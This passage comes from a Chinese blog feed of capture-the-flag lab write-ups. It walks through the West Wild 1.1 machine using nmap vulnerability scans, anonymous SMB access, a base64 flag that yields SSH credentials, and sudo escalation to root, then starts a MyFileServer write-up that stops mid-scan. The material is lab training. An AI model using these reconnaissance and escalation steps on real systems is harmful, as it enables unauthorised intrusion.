WESTWILD\x00<br>|   Domain name: \x00<br>|   FQDN: westwild<br>|_  System time: 2023-10-14T09:25:00+03:00</p></blockquote><p>samba名：westwild</p><h3 id="确定下手顺序"><a href="#确定下手顺序" class="headerlink" title="确定下手顺序"></a>确定下手顺序</h3><p>22端口存在漏洞可能性最低，优先级最后</p><p>139、445 是samba服务，可能会存在信息泄露，应该先先下手</p><p>如果samba服务获取的信息有限，那么将重点放在80端口</p><p>确定下手顺序为：</p><ul><li>139、445</li><li>80</li><li>22</li></ul><p>可以先使用nmap进行进一步的漏洞脚本扫描</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,<span class="number">80</span>,<span class="number">139</span>,<span class="number">445</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/vuln</span><br></pre></td></tr></table></figure><blockquote><p>扫描结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -script=vuln -p22,<span class="number">80</span>,<span class="number">139</span>,<span class="number">445</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/voln</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">14</span> <span class="number">14</span>:<span class="number">54</span> CST</span><br><span class="line"><span class="function">Stats: 0:00:15 <span class="title">elapsed</span>; 0 <span class="title">hosts</span> <span class="title">completed</span> (0 <span class="title">up</span>), 0 <span class="title">undergoing</span> <span class="title">Script</span> <span class="title">Pre</span>-<span class="title">Scan</span></span></span><br><span class="line"><span class="function"><span class="title">NSE</span> <span class="title">Timing</span>: <span class="title">About</span> 83.33% <span class="title">done</span>; <span class="title">ETC</span>: 14:54 (0:00:03 <span class="title">remaining</span>)</span></span><br><span class="line"><span class="function"><span class="title">Pre</span>-<span class="title">scan</span> <span class="title">script</span> <span class="title">results</span>:</span></span><br><span class="line"><span class="function">| <span class="title">broadcast</span>-<span class="title">avahi</span>-<span class="title">dos</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">Discovered</span> <span class="title">hosts</span>:</span></span><br><span class="line"><span class="function">|     224.0.0.251</span></span><br><span class="line"><span class="function">|   <span class="title">After</span> <span class="title">NULL</span> <span class="title">UDP</span> <span class="title">avahi</span> <span class="title">packet</span> <span class="title">DoS</span> (<span class="title">CVE</span>-2011-1002).</span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">Hosts</span> <span class="title">are</span> <span class="title">all</span> <span class="title">up</span> (<span class="title">not</span> <span class="title">vulnerable</span>).</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> <span class="title">WestWild</span> (192.168.31.9)</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00045<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PORT</span>    <span class="title">STATE</span> <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">22/<span class="title">tcp</span>  <span class="title">open</span>  <span class="title">ssh</span></span></span><br><span class="line"><span class="function">80/<span class="title">tcp</span>  <span class="title">open</span>  <span class="title">http</span></span></span><br><span class="line"><span class="function">|<span class="title">_http</span>-<span class="title">csrf</span>: <span class="title">Couldn</span>&#x27;<span class="title">t</span> <span class="title">find</span> <span class="title">any</span> <span class="title">CSRF</span> <span class="title">vulnerabilities</span>.</span></span><br><span class="line"><span class="function">|<span class="title">_http</span>-<span class="title">dombased</span>-<span class="title">xss</span>: <span class="title">Couldn</span>&#x27;<span class="title">t</span> <span class="title">find</span> <span class="title">any</span> <span class="title">DOM</span> <span class="title">based</span> <span class="title">XSS</span>.</span></span><br><span class="line"><span class="function">|<span class="title">_http</span>-<span class="title">stored</span>-<span class="title">xss</span>: <span class="title">Couldn</span>&#x27;<span class="title">t</span> <span class="title">find</span> <span class="title">any</span> <span class="title">stored</span> <span class="title">XSS</span> <span class="title">vulnerabilities</span>.</span></span><br><span class="line"><span class="function">139/<span class="title">tcp</span> <span class="title">open</span>  <span class="title">netbios</span>-<span class="title">ssn</span></span></span><br><span class="line"><span class="function">445/<span class="title">tcp</span> <span class="title">open</span>  <span class="title">microsoft</span>-<span class="title">ds</span></span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:0<span class="title">C</span>:29:49:<span class="title">E0</span>:2<span class="title">E</span> (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">script</span> <span class="title">results</span>:</span></span><br><span class="line"><span class="function">|<span class="title">_smb</span>-<span class="title">vuln</span>-<span class="title">ms10</span>-054: <span class="title">false</span></span></span><br><span class="line"><span class="function">| <span class="title">smb</span>-<span class="title">vuln</span>-<span class="title">regsvc</span>-<span class="title">dos</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">VULNERABLE</span>:</span></span><br><span class="line"><span class="function">|   <span class="title">Service</span> <span class="title">regsvc</span> <span class="title">in</span> <span class="title">Microsoft</span> <span class="title">Windows</span> <span class="title">systems</span> <span class="title">vulnerable</span> <span class="title">to</span> <span class="title">denial</span> <span class="title">of</span> <span class="title">service</span></span></span><br><span class="line"><span class="function">|     <span class="title">State</span>: <span class="title">VULNERABLE</span></span></span><br><span class="line"><span class="function">|       <span class="title">The</span> <span class="title">service</span> <span class="title">regsvc</span> <span class="title">in</span> <span class="title">Microsoft</span> <span class="title">Windows</span> 2000 <span class="title">systems</span> <span class="title">is</span> <span class="title">vulnerable</span> <span class="title">to</span> <span class="title">denial</span> <span class="title">of</span> <span class="title">service</span> <span class="title">caused</span> <span class="title">by</span> <span class="title">a</span> <span class="title">null</span> <span class="title">deference</span></span></span><br><span class="line"><span class="function">|       <span class="title">pointer</span>. <span class="title">This</span> <span class="title">script</span> <span class="title">will</span> <span class="title">crash</span> <span class="title">the</span> <span class="title">service</span> <span class="title">if</span> <span class="title">it</span> <span class="title">is</span> <span class="title">vulnerable</span>. <span class="title">This</span> <span class="title">vulnerability</span> <span class="title">was</span> <span class="title">discovered</span> <span class="title">by</span> <span class="title">Ron</span> <span class="title">Bowes</span></span></span><br><span class="line"><span class="function">|       <span class="title">while</span> <span class="title">working</span> <span class="title">on</span> <span class="title">smb</span>-<span class="title">enum</span>-<span class="title">sessions</span>.</span></span><br><span class="line"><span class="function">|<span class="title">_</span>          </span></span><br><span class="line"><span class="function">|<span class="title">_smb</span>-<span class="title">vuln</span>-<span class="title">ms10</span>-061: <span class="title">false</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 346.34 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure></blockquote><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>使用smbmap进行samba共享的探测</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span></span><br></pre></td></tr></table></figure><blockquote><p>结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# smbmap -H <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>   </span><br><span class="line">[+] Guest session       IP: <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>:<span class="number">445</span>    Name: WestWild                                          </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        <span class="built_in">print</span>$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        wave                                                    READ ONLY       WaveDoor</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (WestWild server (Samba, Ubuntu))</span><br></pre></td></tr></table></figure><p>显示3个samba的共享信息</p><p>print$ 和 IPC$ 都是默认的，但是permissions都是“no access” 不能访问</p><p>wave是可以访问的，试着连接一下</p></blockquote><p>连接smb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.9/wave</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>/wave</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\root]:</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try &quot;<span class="built_in">help</span>&quot; to get a list of possible commands.</span><br><span class="line"><span class="function">smb: \&gt; <span class="title">ls</span></span></span><br><span class="line"><span class="function">  .                                   <span class="title">D</span>        0  <span class="title">Tue</span> <span class="title">Jul</span> 30 13:18:56 2019</span></span><br><span class="line"><span class="function">  ..                                  <span class="title">D</span>        0  <span class="title">Fri</span> <span class="title">Aug</span>  2 07:02:20 2019</span></span><br><span class="line"><span class="function">  <span class="title">FLAG1.txt</span>                           <span class="title">N</span>       93  <span class="title">Tue</span> <span class="title">Jul</span> 30 10:31:05 2019</span></span><br><span class="line"><span class="function">  <span class="title">message_from_aveng.txt</span>              <span class="title">N</span>      115  <span class="title">Tue</span> <span class="title">Jul</span> 30 13:21:48 2019</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                1781464 <span class="title">blocks</span> <span class="title">of</span> <span class="title">size</span> 1024. 285180 <span class="title">blocks</span> <span class="title">available</span></span></span><br><span class="line"><span class="function"><span class="title">smb</span>: \&gt; <span class="title">prompt</span></span></span><br><span class="line"><span class="function"><span class="title">smb</span>: \&gt; <span class="title">mget</span> *.<span class="title">txt</span></span></span><br><span class="line"><span class="function"><span class="title">getting</span> <span class="title">file</span> \<span class="title">FLAG1.txt</span> <span class="title">of</span> <span class="title">size</span> 93 <span class="title">as</span> <span class="title">FLAG1.txt</span> (30.3 <span class="title">KiloBytes</span>/<span class="title">sec</span>) (<span class="title">average</span> 30.3 <span class="title">KiloBytes</span>/<span class="title">sec</span>)</span></span><br><span class="line"><span class="function"><span class="title">getting</span> <span class="title">file</span> \<span class="title">message_from_aveng.txt</span> <span class="title">of</span> <span class="title">size</span> 115 <span class="title">as</span> <span class="title">message_from_aveng.txt</span> (56.1 <span class="title">KiloBytes</span>/<span class="title">sec</span>) (<span class="title">average</span> 40.6 <span class="title">KiloBytes</span>/<span class="title">sec</span>)</span></span><br><span class="line"><span class="function"><span class="title">smb</span>: \&gt;</span></span><br></pre></td></tr></table></figure><p>发现有两个文件，通通下载回来</p><p>（这里的prompt命令的作用是禁用文件下载时的确认提醒</p></blockquote><p>查看下载下来的文件</p><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# ls</span><br><span class="line">公共  视频  文档  音乐  FLAG1.txt            message_from_aveng.txt  starting_point_dguthacker.ovpn</span><br><span class="line">模板  图片  下载  桌面  lab_dguthacker.ovpn  nmapscan</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# cat message_from_aveng.txt </span><br><span class="line">Dear Wave ,</span><br><span class="line">Am Sorry but i was lost my password ,</span><br><span class="line">and i believe that you can reset  it <span class="keyword">for</span> me . </span><br><span class="line">Thank You </span><br><span class="line">Aveng </span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# cat FLAG1.txt             </span><br><span class="line">RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K</span><br></pre></td></tr></table></figure><p>FLAG1.txt 里的东西看起来像base64</p><p>message_from_aveng内容：aveng丢失了密码，要求wave帮忙重置</p></blockquote><p>解码一下base64</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K | base64 -d</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# <span class="built_in">echo</span> RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K | base64 -d</span><br><span class="line">Flag1&#123;Welcome_T0_THE-W3ST-W1LD-B0rder&#125;</span><br><span class="line"><span class="function">user:<span class="title">wavex</span></span></span><br><span class="line"><span class="function"><span class="title">password:door</span>+<span class="title">open</span></span></span><br></pre></td></tr></table></figure><p>一步出明文。</p></blockquote><p>有账号密码了，尝试一下ssh连接看下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh wavex@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# ssh wavex@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span></span><br><span class="line">wavex@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>&#x27;s password: </span><br><span class="line">Welcome to Ubuntu <span class="number">14</span>.<span class="number">04</span>.<span class="number">6</span> LTS (GNU/Linux <span class="number">4</span>.<span class="number">4</span>.<span class="number">0</span>-<span class="number">142</span>-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://<span class="built_in">help</span>.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Sat Oct <span class="number">14</span> <span class="number">10</span>:<span class="number">43</span>:<span class="number">08</span> +<span class="number">03</span> <span class="number">2023</span></span><br><span class="line"></span><br><span class="line">  System load:  <span class="number">0</span>.<span class="number">52</span>              Processes:           <span class="number">161</span></span><br><span class="line">  Usage of /:   <span class="number">77</span>.<span class="number">9</span>% of <span class="number">1</span>.<span class="number">70</span>GB   Users logged <span class="keyword">in</span>:     <span class="number">0</span></span><br><span class="line">  Memory usage: <span class="number">19</span>%               IP address <span class="keyword">for</span> eth0: <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span></span><br><span class="line">  Swap usage:   <span class="number">0</span>%</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system <span class="built_in">at</span>:</span><br><span class="line"><span class="function">    https://<span class="title">landscape.canonical.com</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">New</span> <span class="title">release</span> &#x27;16.04.7 <span class="title">LTS</span>&#x27; <span class="title">available</span>.</span></span><br><span class="line"><span class="function"><span class="title">Run</span> &#x27;<span class="title">do</span>-<span class="title">release</span>-<span class="title">upgrade</span>&#x27; <span class="title">to</span> <span class="title">upgrade</span> <span class="title">to</span> <span class="title">it</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Your</span> <span class="title">Hardware</span> <span class="title">Enablement</span> <span class="title">Stack</span> (<span class="title">HWE</span>) <span class="title">is</span> <span class="title">supported</span> <span class="title">until</span> <span class="title">April</span> 2019.</span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">login</span>: <span class="title">Sat</span> <span class="title">Oct</span> 14 10:43:08 2023</span></span><br><span class="line"><span class="function"><span class="title">wavex</span>@<span class="title">WestWild</span>:~$ <span class="title">who</span></span></span><br><span class="line"><span class="function"><span class="title">wavex</span>    <span class="title">pts</span>/0        2023-10-14 10:59 (<span class="title">lkk</span>)</span></span><br><span class="line"><span class="function"><span class="title">wavex</span>@<span class="title">WestWild</span>:~$ <span class="title">uname</span> -<span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">Linux</span> <span class="title">WestWild</span> 4.4.0-142-<span class="title">generic</span> #168~14.04.1-<span class="title">Ubuntu</span> <span class="title">SMP</span> <span class="title">Sat</span> <span class="title">Jan</span> 19 11:28:33 <span class="title">UTC</span> 2019 <span class="title">i686</span> <span class="title">athlon</span> <span class="title">i686</span> <span class="title">GNU</span>/<span class="title">Linux</span></span></span><br><span class="line"><span class="function"><span class="title">wavex</span>@<span class="title">WestWild</span>:~$</span></span><br></pre></td></tr></table></figure><p>连接成功，试着找找有没有什么有用的信息</p></blockquote><h2 id="开找！命令练习"><a href="#开找！命令练习" class="headerlink" title="开找！命令练习"></a>开找！命令练习</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -writable -<span class="built_in">type</span> f ! -<span class="built_in">path</span> &#x27;/proc/*&#x27; <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>从根目录开始查找所有可写的文件</p><p>排除路径为 ‘/proc/*’ 的文件，把错误信息丢掉（一般查询这个目录里的一些文件会报错，为了避免报错信息干扰）</p><blockquote><p>发现有一个ififorget的文件</p><p>查看里边的东西能看到aveng的用户名和密码</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><blockquote><p><code>sudo -l</code> 命令的作用是列出当前用户在系统上可以以超级用户（root）或其他特权用户的身份执行的命令列表。这是用于查看用户的 sudo 权限的命令。</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><blockquote><p>root</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
          <category> West Wild 1.1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyFileServer</title>
      <link href="/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/MyFileServer/"/>
      <url>/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/MyFileServer/</url>
      
        <content type="html"><![CDATA[<h1 id="MyFileServer"><a href="#MyFileServer" class="headerlink" title="MyFileServer"></a>MyFileServer</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现，扫描整个c段"><a href="#主机发现，扫描整个c段" class="headerlink" title="主机发现，扫描整个c段"></a>主机发现，扫描整个c段</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>确定靶机地址为192.168.31.60</p><h3 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT --min-rate=<span class="number">10000</span> -p- <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -oA nmapscan/ports</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT -p- --min-rate=<span class="number">10000</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -oA nmapscan/ports                      </span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">16</span> <span class="number">10</span>:<span class="number">25</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fileserver (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00072</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">64504</span> filtered tcp ports (no-response), <span class="number">19</span> filtered tcp ports (host-unreach), <span class="number">1004</span> closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">21</span>/tcp    open  ftp</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh</span><br><span class="line"><span class="number">80</span>/tcp    open  http</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds</span><br><span class="line"><span class="number">2049</span>/tcp  open  nfs</span><br><span class="line"><span class="number">2121</span>/tcp  open  ccproxy-ftp</span><br><span class="line"><span class="number">20048</span>/tcp open  mountd</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:<span class="number">60</span>:<span class="number">69</span> (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">13</span>.<span class="number">28</span> seconds</span><br></pre></td></tr></table></figure></blockquote><h4 id="对扫描结果进行简单的处理"><a href="#对扫描结果进行简单的处理" class="headerlink" title="对扫描结果进行简单的处理"></a>对扫描结果进行简单的处理</h4><p>打印全部端口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;<span class="built_in">print</span> $<span class="number">1</span>&#125;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep open nmapscan/prots.nmap | awk -F &#x27;/&#x27; &#x27;&#123;<span class="built_in">print</span> $<span class="number">1</span>&#125;&#x27; | paste -sd &#x27;,&#x27;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# grep &#x27;open&#x27; nmapscan/ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;<span class="built_in">print</span> $<span class="number">1</span>&#125;&#x27; | paste -sd &#x27;,&#x27;</span><br><span class="line"><span class="number">21</span>,<span class="number">22</span>,<span class="number">80</span>,<span class="number">111</span>,<span class="number">445</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">20048</span></span><br></pre></td></tr></table></figure><p>这样能得到一个方便后续操作的参数格式</p></blockquote><h3 id="对端口服务进行详细扫描"><a href="#对端口服务进行详细扫描" class="headerlink" title="对端口服务进行详细扫描"></a>对端口服务进行详细扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -O -sC -p21,<span class="number">22</span>,<span class="number">80</span>,<span class="number">111</span>,<span class="number">445</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">20048</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -oA /home/lkk/nmapscan/detail</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT -sV -O -sC -p21,<span class="number">22</span>,<span class="number">80</span>,<span class="number">111</span>,<span class="number">445</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">20048</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -oA /home/lkk/nmapscan/detail</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) 